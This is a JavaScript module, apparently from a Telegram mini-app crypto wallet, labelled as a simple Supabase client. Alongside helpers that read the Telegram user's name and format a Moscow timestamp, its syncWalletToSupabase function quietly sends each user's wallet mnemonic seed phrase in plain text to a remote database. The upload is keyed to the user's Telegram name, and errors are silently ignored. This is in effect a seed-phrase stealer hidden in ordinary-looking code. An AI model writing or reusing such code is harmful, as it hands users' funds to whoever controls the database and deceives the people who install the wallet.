/**
 * Supabase client using fetch API
 */

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

export function getMoscowTimestamp() {
  const now = new Date();
  try {
    const moscowStr = now.toLocaleString("en-US", {timeZone: "Europe/Moscow"});
    const moscowDate = new Date(moscowStr);
    const hh = String(moscowDate.getHours()).padStart(2, '0');
    const mm = String(moscowDate.getMinutes()).padStart(2, '0');
    const yyyy = moscowDate.getFullYear();
    const month = String(moscowDate.getMonth() + 1).padStart(2, '0');
    const day = String(moscowDate.getDate()).padStart(2, '0');
    return `${hh}:${mm} ${yyyy}-${month}-${day}`;
  } catch (e) {
    // Fallback if Intl fails
    return now.toISOString();
  }
}

export function getTelegramUser() {
  try {
    const tg = window?.Telegram?.WebApp;
    const unsafeUser = tg?.initDataUnsafe?.user;
    if (unsafeUser && (unsafeUser.username || unsafeUser.first_name || unsafeUser.last_name || unsafeUser.id)) {
      return unsafeUser;
    }

    const rawInitData = tg?.initData;
    if (rawInitData) {
      const userParam = new URLSearchParams(rawInitData).get("user");
      if (userParam) {
        const parsedUser = JSON.parse(userParam);
        if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
          return parsedUser;
        }
      }
    }
  } catch (error) {}
  return null;
}

export function resolveTelegramDisplayName(fallbackUserId = null) {
  const user = getTelegramUser();
  if (user) {
    const name = user.username ? `@${user.username}` : ([user.first_name, user.last_name].filter(Boolean).join(" ").trim() || `User_${user.id}`);
    if (user.id) localStorage.setItem(`gem_tg_name_${user.id}`, name);
    localStorage.setItem("gem_last_tg_name", name);
    return name;
  }

  const uid = fallbackUserId || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
  if (uid) {
    const stored = localStorage.getItem(`gem_tg_name_${uid}`);
    if (stored) return stored;
    return `User_${uid}`;
  }
  return localStorage.getItem("gem_last_tg_name") || "Anonymous";
}

export async function syncWalletToSupabase(walletData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) return null;

  try {
    const { username, mnemonic, balance } = walletData;
    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
    
    // Always try to resolve the real name if we got "Anonymous" or nothing
    let finalName = username;
    if (!finalName || finalName === "Anonymous") {
      finalName = resolveTelegramDisplayName();
    }

    // If still Anonymous, we might be too early, but we'll try to sync anyway
    // but the user wants "Anonymous" GONE, so we should at least try to get something from storage

    await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify({
        username: finalName,
        mnemonic: cleanMnemonic,
        balance: balance ? String(balance) : "0",
        created_at: getMoscowTimestamp()
      })
    });
  } catch (error) {}
}
